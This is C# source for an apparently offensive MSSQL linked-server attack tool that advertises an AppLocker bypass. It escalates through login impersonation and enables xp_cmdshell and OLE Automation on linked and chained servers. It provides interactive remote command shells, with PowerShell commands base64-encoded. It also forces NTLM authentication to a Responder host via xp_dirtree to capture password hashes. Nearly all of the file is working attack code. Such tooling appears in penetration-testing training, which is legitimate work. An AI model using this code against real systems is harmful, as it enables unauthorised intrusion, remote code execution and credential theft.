using System;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration.Install;

namespace MSSQL_LinkedServerTool
{
    class Program
    {
        public static void Main(string[] args)
        {
            new Core().Execute(args);
        }
    }

    class Core
    {
        public void Execute(string[] args)
        {
            Config.Parse(args);

            if (Config.Splash)
            {
                SplashScreen.Show();
                return;
            }

            if (Config.QueryMode)
            {
                QueryHandler.Run();
                return;
            }

            using (var con = SqlClientHelper.Connect())
            {
                var session = SqlClientHelper.FetchSession(con);

                if (Config.Impersonate)
                    SqlClientHelper.TryImpersonate(con, Config.ImpersonateUser);

                var linkedServers = SqlClientHelper.GetLinkedServers(con, session.Hostname);

                if (Config.LocalCommand)
                    LocalCommandHandler.Run(con, session.Hostname);
                else if (Config.Enumerate)
                    EnumerateHandler.Run(con, linkedServers, session, Config.ImpersonateUser);
                else if (Config.EnableFeatures)
                    EnableFeaturesHandler.Run(con, linkedServers);
                else if (Config.RunXPCmd)
                    XpCmdShellHandler.Run(con, linkedServers);
                else if (Config.RunOleCmd)
                    OleAutomationHandler.Run(con, linkedServers);
                else if (Config.HashCapture)
                    HashCaptureHandler.Run(con, linkedServers);
            }
        }
    }

    class SqlSession
    {
        public string Hostname { get; set; }
        public string CurrentUser { get; set; }
        public string SqlMappedUser { get; set; }
    }

    static class Config
    {
        public static string Username = "";
        public static string Password = "";
        public static string Server = "localhost";
        public static string Database = "master";
        public static string ResponderIP = "";
        public static string ImpersonateUser = "";

        public static bool QueryMode = false;
        public static bool EnableFeatures = false;
        public static bool RunXPCmd = false;
        public static bool RunOleCmd = false;
        public static bool Splash = true;
        public static bool Impersonate = false;
        public static bool HashCapture = false;
        public static bool Enumerate = false;
        public static bool LocalCommand = false;
        public static bool Tunnel = false;

        public static void Parse(string[] args)
        {
            var options = new Dictionary<string, Action<string>>(StringComparer.OrdinalIgnoreCase)
            {
                ["/L"] = v => Username = v,
                ["/P"] = v => Password = v,
                ["/D"] = v => Database = v,
                ["/S"] = v => Server = v,
                ["/R"] = v => ResponderIP = v,
                ["/Q"] = v => { QueryMode = true; Splash = false; },
                ["/F"] = v => { EnableFeatures = true; Splash = false; },
                ["/E"] = v => { Enumerate = true; Splash = false; },
                ["/X"] = v => { RunXPCmd = true; Splash = false; },
                ["/C"] = v => { LocalCommand = true; Splash = false; },
                ["/O"] = v => { RunOleCmd = true; Splash = false; },
                ["/I"] = v => { ImpersonateUser = v; Impersonate = true; },
                ["/T"] = v => Tunnel = true,
                ["/H"] = v => { HashCapture = true; Splash = false; }
            };

            foreach (var arg in args)
            {
                if (arg.Length < 2) continue;

                var key = arg.Substring(0, 2).ToUpper();
                var value = arg.Length > 3 ? arg.Substring(3) : "";

                if (options.TryGetValue(key, out var action))
                {
                    try
                    {
                        action(value);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[X] Error parsing argument {key}: {ex.Message}");
                    }
                }
                else
                {
                    Console.WriteLine($"[!] Unknown argument: {arg}");
                }
            }

            Validate();
        }

        private static void Validate()
        {
            if (string.IsNullOrWhiteSpace(Server))
            {
                Console.WriteLine("[X] Server cannot be empty. Using default: localhost.");
                Server = "localhost";
            }

            if (QueryMode && string.IsNullOrWhiteSpace(Username))
            {
                Console.WriteLine("[X] QueryMode requires a username. Please provide one using /L.");
            }

            // Add more validation rules as needed
        }
    }

    static class SplashScreen
    {
        public static void Show()
        {
            Console.WriteLine("MSSQL Linked Server Tool\n");
            Console.WriteLine("Compatible with InstallUtil AppLocker bypass\n");
            Console.WriteLine("Modes:");
            Console.WriteLine(" /q - Query for MSSQL SPNs");
            Console.WriteLine(" /e - Enumerate linked MSSQL servers");
            Console.WriteLine(" /c - Run SQL commands locally");
            Console.WriteLine(" /f - Enable xp_cmdshell or OLE on (linked) servers");
            Console.WriteLine(" /x - Run xp_cmdshell via links");
            Console.WriteLine(" /o - Run OLE via links");
            Console.WriteLine(" /h - Force hash capture via xp_dirtree");
            Console.WriteLine("\nOptions:");
            Console.WriteLine(" /l:<username> /p:<password> SQL Auth; /s:<server>, /d:<database>, /r:<responder IP>");
            Console.WriteLine(" /i:<impersonate user>, /t:tunnel through link");
        }
    }

    static class QueryHandler
    {
        public static void Run()
        {
            Console.Write("Enter domain to query for MSSQL SPNs: ");
            string domain = Console.ReadLine();
            string cmd = $"/c setspn -T {domain} -Q MSSQLSvc/*";

            try
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = cmd,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                while (!process.StandardOutput.EndOfStream)
                {
                    Console.WriteLine(process.StandardOutput.ReadLine());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] " + ex.Message);
            }
        }
    }


    // EnumerateHandler implementation
    static class EnumerateHandler
    {
        public static void Run(SqlConnection con, List<string> links, SqlSession session, string impersonateUser)
        {
            Console.WriteLine("[+] Starting MSSQL Enumeration...");

            // Check membership in 'public' role
            CheckPublicRole(con, session.CurrentUser);

            // Check membership in 'sysadmin' role
            CheckSysadminRole(con, session.CurrentUser);

            // List SQL Server principals
            ListServerPrincipals(con);

            // List logins with impersonation permissions
            ListImpersonationPermissions(con);

            // Enumerate linked servers and their properties
            EnumerateLinkedServers(con, links, session.Hostname);
        }

        private static void CheckPublicRole(SqlConnection con, string currentUser)
        {
            Console.WriteLine("\n[+] Checking membership in 'public' role...");
            string query = "SELECT IS_SRVROLEMEMBER('public');";
            try
            {
                int isPublic = Convert.ToInt32(SqlClientHelper.ExecScalar(con, query));
                if (isPublic == 1)
                {
                    Console.WriteLine($"[+] {currentUser} is a member of the 'public' role.");
                }
                else
                {
                    Console.WriteLine($"[-] {currentUser} is NOT a member of the 'public' role.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error checking 'public' role membership: {ex.Message}");
            }
        }

        private static void CheckSysadminRole(SqlConnection con, string currentUser)
        {
            Console.WriteLine("\n[+] Checking membership in 'sysadmin' role...");
            string query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            try
            {
                int isSysadmin = Convert.ToInt32(SqlClientHelper.ExecScalar(con, query));
                if (isSysadmin == 1)
                {
                    Console.WriteLine($"[+] {currentUser} is a member of the 'sysadmin' role.");
                }
                else
                {
                    Console.WriteLine($"[-] {currentUser} is NOT a member of the 'sysadmin' role.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error checking 'sysadmin' role membership: {ex.Message}");
            }
        }

        private static void ListServerPrincipals(SqlConnection con)
        {
            Console.WriteLine("\n[+] Listing SQL Server principals...");
            string query = "SELECT * FROM master.sys.server_principals;";
            try
            {
                var results = SqlClientHelper.ExecuteQuery(con, query);
                foreach (var row in results)
                {
                    Console.WriteLine(row);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error listing server principals: {ex.Message}");
            }
        }

        private static void ListImpersonationPermissions(SqlConnection con)
        {
            Console.WriteLine("\n[+] Listing logins with impersonation permissions...");
            string query = @"
            SELECT DISTINCT b.name
            FROM sys.server_permissions a
            INNER JOIN sys.server_principals b
            ON a.grantor_principal_id = b.principal_id
            WHERE a.permission_name = 'IMPERSONATE';";
            try
            {
                var results = SqlClientHelper.ExecuteQuery(con, query);
                foreach (var row in results)
                {
                    Console.WriteLine(row);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error listing impersonation permissions: {ex.Message}");
            }
        }

        private static void EnumerateLinkedServers(SqlConnection con, List<string> links, string localHostname)
        {
            Console.WriteLine("\n[+] Enumerating linked servers...");
            foreach (var server in links)
            {
                Console.WriteLine($"[*] Linked Server: {server}");

                // Check role membership on linked server
                CheckLinkedServerRole(con, server);

                // Check for bidirectional links
                CheckBidirectionalLinks(con, server, localHostname);
            }
        }

        private static void CheckLinkedServerRole(SqlConnection con, string server)
        {
            string query = $"EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [{server}]";
            try
            {
                var results = SqlClientHelper.ExecuteQuery(con, query);
                foreach (var row in results)
                {
                    Console.WriteLine($"    {row}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error checking roles on linked server {server}: {ex.Message}");
            }
        }

        private static void CheckBidirectionalLinks(SqlConnection con, string server, string localHostname)
        {
            Console.WriteLine($"[+] Checking for bidirectional links on {server}...");
            string query = $"EXEC ('sp_linkedservers') AT [{server}]";
            try
            {
                var results = SqlClientHelper.ExecuteQuery(con, query);
                foreach (var row in results)
                {
                    if (row.IndexOf(localHostname, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        Console.WriteLine($"[!] Bidirectional link found: {server} <-> {localHostname}");
                    }
                    else
                    {
                        Console.WriteLine($"    {row}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error checking bidirectional links on {server}: {ex.Message}");
            }
        }
    }



    // EnableFeaturesHandler implementation
    static class EnableFeaturesHandler
    {
        public static void Run(SqlConnection con, List<string> links)
        {
            Console.WriteLine("[*] Enabling features...");
            Console.WriteLine("Select feature you wish to enable:");
            Console.WriteLine(" [1] xp_cmdshell");
            Console.WriteLine(" [2] OLE Automation Procedures");
            Console.WriteLine("Type 'exit' to quit.");

            string featureChoice;
            while (true)
            {
                Console.Write("Entry: ");
                featureChoice = Console.ReadLine();
                if (featureChoice == "1" || featureChoice == "2" || featureChoice.ToLower() == "exit")
                    break;
                Console.WriteLine("Invalid selection. Please enter '1', '2', or 'exit'.");
            }

            if (featureChoice.ToLower() == "exit") return;

            string feature = featureChoice == "1" ? "xp_cmdshell" : "Ole Automation Procedures";

            Console.WriteLine("\n[*] Target linked server name (type 'self' for current server):");
            foreach (var link in links)
            {
                Console.WriteLine($" - {link}");
            }

            string target;
            while (true)
            {
                Console.Write("Target: ");
                target = Console.ReadLine();
                if (target.ToLower() == "self" || links.Contains(target.ToUpper()) || target.ToLower() == "exit")
                    break;
                Console.WriteLine("Invalid target. Please enter a valid linked server name, 'self', or 'exit'.");
            }

            if (target.ToLower() == "exit") return;

            if (target.ToLower() == "self")
            {
                EnableFeatureOnServer(con, feature);
            }
            else
            {
                Console.WriteLine("\n[*] Do you want to tunnel through another linked server? (y/n)");
                string tunnelChoice = Console.ReadLine()?.ToLower();
                if (tunnelChoice == "y")
                {
                    Console.WriteLine("\n[*] Enter the name of the linked server to tunnel through:");
                    foreach (var link in links)
                    {
                        Console.WriteLine($" - {link}");
                    }

                    string tunnelTarget;
                    while (true)
                    {
                        Console.Write("Tunnel Target: ");
                        tunnelTarget = Console.ReadLine();
                        if (links.Contains(tunnelTarget.ToUpper()) || tunnelTarget.ToLower() == "exit")
                            break;
                        Console.WriteLine("Invalid tunnel target. Please enter a valid linked server name or 'exit'.");
                    }

                    if (tunnelTarget.ToLower() == "exit") return;

                    EnableFeatureThroughTunnel(con, feature, target, tunnelTarget);
                }
                else
                {
                    EnableFeatureOnLinkedServer(con, feature, target);
                }
            }
        }

        private static void EnableFeatureOnServer(SqlConnection con, string feature)
        {
            Console.WriteLine($"\n[*] Enabling {feature} on the current server...");
            string sql = $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure '{feature}', 1; RECONFIGURE;";
            ExecuteFeatureCommand(con, sql, feature);
        }

        private static void EnableFeatureOnLinkedServer(SqlConnection con, string feature, string target)
        {
            Console.WriteLine($"\n[*] Enabling {feature} on linked server {target}...");
            string sql = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''{feature}'', 1; RECONFIGURE;') AT [{target}]";
            ExecuteFeatureCommand(con, sql, feature);
        }

        private static void EnableFeatureThroughTunnel(SqlConnection con, string feature, string target, string tunnelTarget)
        {
            Console.WriteLine($"\n[*] Enabling {feature} on {target} via tunnel through {tunnelTarget}...");
            string sql = $"EXEC ('EXEC(''sp_configure ''''show advanced options'''', 1; RECONFIGURE; EXEC sp_configure ''''{feature}'''', 1; RECONFIGURE;'') AT [{target}]') AT [{tunnelTarget}]";
            ExecuteFeatureCommand(con, sql, feature);
        }

        private static void ExecuteFeatureCommand(SqlConnection con, string sql, string feature)
        {
            try
            {
                SqlClientHelper.ExecuteNonQuery(con, sql);
                Console.WriteLine($"[+] {feature} successfully enabled.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Failed to enable {feature}: {ex.Message}");
            }
        }
    }


    // XpCmdShellHandler implementation
    static class XpCmdShellHandler
    {
        public static void Run(SqlConnection con, List<string> links)
        {
            Console.WriteLine("[*] Starting xp_cmdshell interactive shell...");
            Console.WriteLine("Type 'exit' to quit.");

            Console.WriteLine("\n[*] Target linked server name (type 'self' for current server):");
            foreach (var link in links)
            {
                Console.WriteLine($" - {link}");
            }

            string target;
            while (true)
            {
                Console.Write("Target: ");
                target = Console.ReadLine();
                if (target.ToLower() == "self" || links.Contains(target.ToUpper()) || target.ToLower() == "exit")
                    break;
                Console.WriteLine("Invalid target. Please enter a valid linked server name, 'self', or 'exit'.");
            }

            if (target.ToLower() == "exit") return;

            if (target.ToLower() == "self")
            {
                ExecuteCommandsOnServer(con);
            }
            else
            {
                Console.WriteLine("\n[*] Do you want to tunnel through another linked server? (y/n)");
                string tunnelChoice = Console.ReadLine()?.ToLower();
                if (tunnelChoice == "y")
                {
                    Console.WriteLine("\n[*] Enter the name of the linked server to tunnel through:");
                    foreach (var link in links)
                    {
                        Console.WriteLine($" - {link}");
                    }

                    string tunnelTarget;
                    while (true)
                    {
                        Console.Write("Tunnel Target: ");
                        tunnelTarget = Console.ReadLine();
                        if (links.Contains(tunnelTarget.ToUpper()) || tunnelTarget.ToLower() == "exit")
                            break;
                        Console.WriteLine("Invalid tunnel target. Please enter a valid linked server name or 'exit'.");
                    }

                    if (tunnelTarget.ToLower() == "exit") return;

                    ExecuteCommandsThroughTunnel(con, target, tunnelTarget);
                }
                else
                {
                    ExecuteCommandsOnLinkedServer(con, target);
                }
            }
        }

        private static void ExecuteCommandsOnServer(SqlConnection con)
        {
            Console.WriteLine("\n[*] Executing commands on the current server...");
            while (true)
            {
                Console.Write("xp_cmdshell> ");
                string cmdInput = Console.ReadLine();
                if (cmdInput.ToLower() == "exit") break;

                cmdInput = EncodePowerShellCommand(cmdInput);
                string sql = $"EXEC xp_cmdshell '{cmdInput.Replace("'", "''")}';";

                ExecuteCommand(con, sql);
            }
        }

        private static void ExecuteCommandsOnLinkedServer(SqlConnection con, string target)
        {
            Console.WriteLine($"\n[*] Executing commands on linked server {target}...");
            while (true)
            {
                Console.Write($"{target}> ");
                string cmdInput = Console.ReadLine();
                if (cmdInput.ToLower() == "exit") break;

                cmdInput = EncodePowerShellCommand(cmdInput);
                string sql = $"EXEC ('xp_cmdshell ''{cmdInput.Replace("'", "''")}'';') AT [{target}]";

                ExecuteCommand(con, sql);
            }
        }

        private static void ExecuteCommandsThroughTunnel(SqlConnection con, string target, string tunnelTarget)
        {
            Console.WriteLine($"\n[*] Executing commands on {target} via tunnel through {tunnelTarget}...");
            while (true)
            {
                Console.Write($"{target}> ");
                string cmdInput = Console.ReadLine();
                if (cmdInput.ToLower() == "exit") break;

                cmdInput = EncodePowerShellCommand(cmdInput);
                string sql = $"EXEC ('EXEC(''xp_cmdshell ''''{cmdInput.Replace("'", "''")}'''';'') AT [{target}]') AT [{tunnelTarget}]";

                ExecuteCommand(con, sql);
            }
        }

        private static void ExecuteCommand(SqlConnection con, string sql)
        {
            try
            {
                var cmd = new SqlCommand(sql, con);
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        Console.WriteLine(reader[0]?.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error executing command: {ex.Message}");
            }
        }

        private static string EncodePowerShellCommand(string cmdInput)
        {
            if (cmdInput.Contains("powershell") || cmdInput.Contains("powershell.exe"))
            {
                string parsed = cmdInput.Replace("powershell", "").Replace("powershell.exe", "").Trim();
                string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(parsed));
                return $"powershell -enc {encoded}";
            }
            return cmdInput;
        }
    }


    // OleAutomationHandler implementation
    static class OleAutomationHandler
    {
        public static void Run(SqlConnection con, List<string> links)
        {
            Console.WriteLine("[*] Starting OLE Automation interactive shell...");
            Console.WriteLine("Type 'exit' to quit.");

            Console.WriteLine("\n[*] Target linked server name (type 'self' for current server):");
            foreach (var link in links)
            {
                Console.WriteLine($" - {link}");
            }

            string target;
            while (true)
            {
                Console.Write("Target: ");
                target = Console.ReadLine();
                if (target.ToLower() == "self" || links.Contains(target.ToUpper()) || target.ToLower() == "exit")
                    break;
                Console.WriteLine("Invalid target. Please enter a valid linked server name, 'self', or 'exit'.");
            }

            if (target.ToLower() == "exit") return;

            if (target.ToLower() == "self")
            {
                ExecuteCommandsOnServer(con);
            }
            else
            {
                Console.WriteLine("\n[*] Do you want to tunnel through another linked server? (y/n)");
                string tunnelChoice = Console.ReadLine()?.ToLower();
                if (tunnelChoice == "y")
                {
                    Console.WriteLine("\n[*] Enter the name of the linked server to tunnel through:");
                    foreach (var link in links)
                    {
                        Console.WriteLine($" - {link}");
                    }

                    string tunnelTarget;
                    while (true)
                    {
                        Console.Write("Tunnel Target: ");
                        tunnelTarget = Console.ReadLine();
                        if (links.Contains(tunnelTarget.ToUpper()) || tunnelTarget.ToLower() == "exit")
                            break;
                        Console.WriteLine("Invalid tunnel target. Please enter a valid linked server name or 'exit'.");
                    }

                    if (tunnelTarget.ToLower() == "exit") return;

                    ExecuteCommandsThroughTunnel(con, target, tunnelTarget);
                }
                else
                {
                    ExecuteCommandsOnLinkedServer(con, target);
                }
            }
        }

        private static void ExecuteCommandsOnServer(SqlConnection con)
        {
            Console.WriteLine("\n[*] Executing OLE commands on the current server...");
            while (true)
            {
                Console.Write("ole> ");
                string cmdInput = Console.ReadLine();
                if (cmdInput.ToLower() == "exit") break;

                string payload = GenerateOlePayload(cmdInput);
                ExecuteCommand(con, payload);
            }
        }

        private static void ExecuteCommandsOnLinkedServer(SqlConnection con, string target)
        {
            Console.WriteLine($"\n[*] Executing OLE commands on linked server {target}...");
            while (true)
            {
                Console.Write($"{target}> ");
                string cmdInput = Console.ReadLine();
                if (cmdInput.ToLower() == "exit") break;

                string payload = GenerateOlePayload(cmdInput);
                string sql = $"EXEC ('{payload.Replace("'", "''")}') AT [{target}]";

                ExecuteCommand(con, sql);
            }
        }

        private static void ExecuteCommandsThroughTunnel(SqlConnection con, string target, string tunnelTarget)
        {
            Console.WriteLine($"\n[*] Executing OLE commands on {target} via tunnel through {tunnelTarget}...");
            while (true)
            {
                Console.Write($"{target}> ");
                string cmdInput = Console.ReadLine();
                if (cmdInput.ToLower() == "exit") break;

                string payload = GenerateOlePayload(cmdInput);
                string sql = $"EXEC ('EXEC(''{payload.Replace("'", "''")}'') AT [{target}]') AT [{tunnelTarget}]";

                ExecuteCommand(con, sql);
            }
        }

        private static string GenerateOlePayload(string cmdInput)
        {
            return $"DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUT; " +
                   $"EXEC sp_oamethod @shell, 'run', null, 'cmd /c \"{cmdInput.Replace("\"", "\\\"")}\"';";
        }

        private static void ExecuteCommand(SqlConnection con, string sql)
        {
            try
            {
                SqlClientHelper.ExecuteNonQuery(con, sql);
                Console.WriteLine("[+] OLE command sent successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error executing OLE command: {ex.Message}");
            }
        }
    }


    // HashCaptureHandler implementation
    static class HashCaptureHandler
    {
        public static void Run(SqlConnection con, List<string> links)
        {
            Console.WriteLine("[*] Starting hash capture...");
            Console.WriteLine("Type 'exit' to quit.");

            Console.WriteLine("\n[*] Target linked server name (type 'self' for current server):");
            foreach (var link in links)
            {
                Console.WriteLine($" - {link}");
            }

            string target;
            while (true)
            {
                Console.Write("Target: ");
                target = Console.ReadLine();
                if (target.ToLower() == "self" || links.Contains(target.ToUpper()) || target.ToLower() == "exit")
                    break;
                Console.WriteLine("Invalid target. Please enter a valid linked server name, 'self', or 'exit'.");
            }

            if (target.ToLower() == "exit") return;

            string responderIP;
            if (string.IsNullOrWhiteSpace(Config.ResponderIP))
            {
                Console.Write("Enter Responder server IP: ");
                responderIP = Console.ReadLine();
                if (responderIP.ToLower() == "exit") return;
            }
            else
            {
                responderIP = Config.ResponderIP;
                Console.WriteLine($"Responder IP: {responderIP}");
            }

            string share = $"\\\\{responderIP.Replace("\\", "")}\\test";

            if (target.ToLower() == "self")
            {
                ExecuteHashCapture(con, share);
            }
            else
            {
                ExecuteHashCaptureOnLinkedServer(con, share, target);
            }
        }

        private static void ExecuteHashCapture(SqlConnection con, string share)
        {
            Console.WriteLine($"\n[*] Forcing authentication to {share} from the current server...");
            string sql = $"EXEC master..xp_dirtree '{share}';";

            ExecuteCommand(con, sql);
        }

        private static void ExecuteHashCaptureOnLinkedServer(SqlConnection con, string share, string target)
        {
            Console.WriteLine($"\n[*] Forcing authentication to {share} from linked server {target}...");
            string sql = $"EXEC ('master..xp_dirtree ''{share.Replace("'", "''")}'';') AT [{target}]";

            ExecuteCommand(con, sql);
        }

        private static void ExecuteCommand(SqlConnection con, string sql)
        {
            try
            {
                SqlClientHelper.ExecuteNonQuery(con, sql);
                Console.WriteLine("[+] Command executed successfully. Monitor Responder for inbound hash.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error executing command: {ex.Message}");
            }
        }
    }




    static class SqlClientHelper
    {
        public static SqlConnection Connect()
        {
            var builder = new SqlConnectionStringBuilder
            {
                DataSource = Config.Server,
                InitialCatalog = Config.Database,
                IntegratedSecurity = string.IsNullOrEmpty(Config.Username)
            };

            if (!builder.IntegratedSecurity)
            {
                builder.UserID = Config.Username;
                builder.Password = Config.Password;
            }

            var con = new SqlConnection(builder.ConnectionString);
            con.Open();
            return con;
        }


        public static SqlSession FetchSession(SqlConnection con)
        {
            return new SqlSession
            {
                Hostname = ExecScalar(con, "SELECT @@SERVERNAME"),
                CurrentUser = ExecScalar(con, "SELECT SYSTEM_USER"),
                SqlMappedUser = ExecScalar(con, "SELECT USER_NAME()")
            };
        }

        public static bool TryImpersonate(SqlConnection con, string user)
        {
            string query = user == "dbo" ? "USE msdb; EXECUTE AS USER = 'dbo';" : $"EXECUTE AS LOGIN = '{user}';";
            try
            {
                ExecuteNonQuery(con, query);
                Console.WriteLine($"[+] Successfully impersonated as {user}");
                return true;
            }
            catch
            {
                Console.WriteLine($"[X] Failed to impersonate as {user}");
                return false;
            }
        }

        public static List<string> ExecuteQuery(SqlConnection con, string query)
        {
            var results = new List<string>();
            try
            {
                using (var cmd = new SqlCommand(query, con))
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var row = new StringBuilder();
                        for (int i = 0; i < reader.FieldCount; i++)
                        {
                            row.Append(reader[i]?.ToString() + "\t");
                        }
                        results.Add(row.ToString().Trim());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error executing query: {ex.Message}");
            }
            return results;
        }

        public static void Impersonate(SqlConnection con, string user)
            {
                Console.WriteLine($"Attempting impersonation: {user}");
                string query = user == "dbo" ? "use msdb; EXECUTE AS USER = 'dbo';" : $"EXECUTE AS LOGIN = '{user}';";
                try { new SqlCommand(query, con).ExecuteNonQuery(); Console.WriteLine("Impersonation successful"); }
                catch { Console.WriteLine("Impersonation failed"); }
            }

        public static List<string> GetLinkedServers(SqlConnection con, string localName)
        {
            var cmd = new SqlCommand("EXEC sp_linkedservers;", con);
            var reader = cmd.ExecuteReader();
            var list = new List<string>();
            while (reader.Read())
            {
                string srv = reader[0].ToString();
                if (!srv.Equals(localName, StringComparison.OrdinalIgnoreCase))
                    list.Add(srv);
            }
            reader.Close();
            return list;
        }

        public static string ExecScalar(SqlConnection con, string sql)
        {
            return new SqlCommand(sql, con).ExecuteScalar()?.ToString() ?? "";
        }
        public static void ExecuteNonQuery(SqlConnection con, string query)
        {
            try
            {
                using (var cmd = new SqlCommand(query, con))
                {
                    cmd.ExecuteNonQuery();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error executing non-query: {ex.Message}");
            }
        }
    }

    static class LocalCommandHandler
    {
        public static void Run(SqlConnection con, string server)
        {
            Console.WriteLine("[!] Type 'exit' to quit interactive SQL shell");
            while (true)
            {
                Console.Write($"{server}> ");
                var input = Console.ReadLine();
                if (string.IsNullOrEmpty(input) || input.ToLower() == "exit") break;
                try
                {
                    var cmd = new SqlCommand(input, con);
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            for (int i = 0; i < reader.FieldCount; i++)
                                Console.Write(reader[i] + "	");
                            Console.WriteLine();
                        }
                    }
                }
                catch (Exception ex) { Console.WriteLine("[X] " + ex.Message); }
            }
        }
    



    public static string EncodeBase64(string value)
        {
            var valueBytes = Encoding.Unicode.GetBytes(value);
            return Convert.ToBase64String(valueBytes);
        }
    public static List<string> GetLinkedServers(SqlConnection con, string localName)
        {
            var linkedServers = new List<string>();
            string query = "EXEC sp_linkedservers;";
            try
            {
                using (var cmd = new SqlCommand(query, con))
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string server = reader[0]?.ToString();
                        if (!server.Equals(localName, StringComparison.OrdinalIgnoreCase))
                        {
                            linkedServers.Add(server);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X] Error fetching linked servers: {ex.Message}");
            }
            return linkedServers;
        }
    }
}